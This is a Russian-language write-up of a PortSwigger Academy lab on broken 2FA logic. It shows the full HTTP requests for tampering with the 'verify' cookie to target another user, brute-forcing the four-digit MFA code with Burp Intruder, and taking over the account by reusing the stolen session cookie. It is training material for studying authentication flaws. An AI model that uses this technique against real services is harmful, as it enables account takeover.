---
title: "2FA broken logic"
date: 2025-09-12
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-multi-factor-authentication/authentication/multi-factor/lab-2fa-broken-logic"
classes: wide
---

В данной лабе нарушена логика двухфакторной аутентификации. Для прохождения нужно получить доступ к аккаунту `carlos`. Даны креды от нашего пользователя `wiener`:`peter`.

```
https://0aa300a704e0a59a81867f920029008c.web-security-academy.net
```

## Solution

Сразу пойду на страницу логина, чтобы собрать все запросы:

Получаею страницу для входа:

```http
GET /login HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=LQDyifn6acpYrKiyvaAXblZiWDQObt25
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Ввожу данные:

```http
POST /login HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=LQDyifn6acpYrKiyvaAXblZiWDQObt25
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&password=peter
```

Редирект на форму ввода кода:

```http
GET /login2 HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=GuGvuYdgcYBbmadL3h4qUABwMvGbPjN8; verify=wiener
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Отправка кода:

```http
POST /login2 HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=GuGvuYdgcYBbmadL3h4qUABwMvGbPjN8; verify=wiener
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/login2
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=0115
```

Переход на страницу аккаунта:

```http
GET /my-account HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=LQDyifn6acpYrKiyvaAXblZiWDQObt25
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

После ввода логина и пароля сайт установил мне `Cookie` значение `verify=winer`. Попробую отправить запрос `GET /login2`, изменив значение `verify` на `carlos`.

```http
GET /login2 HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=GuGvuYdgcYBbmadL3h4qUABwMvGbPjN8; verify=carlos
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Получил форму ввода кода:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_2FA_broken_logic/1.png){: height="200" .align-center}

Попробую подобрать нужный пароль через `Intruder` простым брутфорсом:

```http
POST /login2 HTTP/2
Host: 0aa300a704e0a59a81867f920029008c.web-security-academy.net
Cookie: session=GuGvuYdgcYBbmadL3h4qUABwMvGbPjN8; verify=carlos
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net/login2
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: https://0aa300a704e0a59a81867f920029008c.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

mfa-code=§code§
```

Настройки пейлоада:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_2FA_broken_logic/2.png){: height="200" .align-center}

Провел атаку и отсортировал по коду ответа. При правильном коде я должен получить ответ `302`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_2FA_broken_logic/3.png){: height="200" .align-center}

Вытащу значение `session` из `Cookie` ответа и вставлю в браузере для входа:

```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=RaBbH8fs2OGpCmO1fscpJQXrw5iivK5R; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_2FA_broken_logic/4.png){: height="200" .align-center}

Обновил страницу. И вот я залогинился)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_2FA_broken_logic/5.png){: height="200" .align-center}
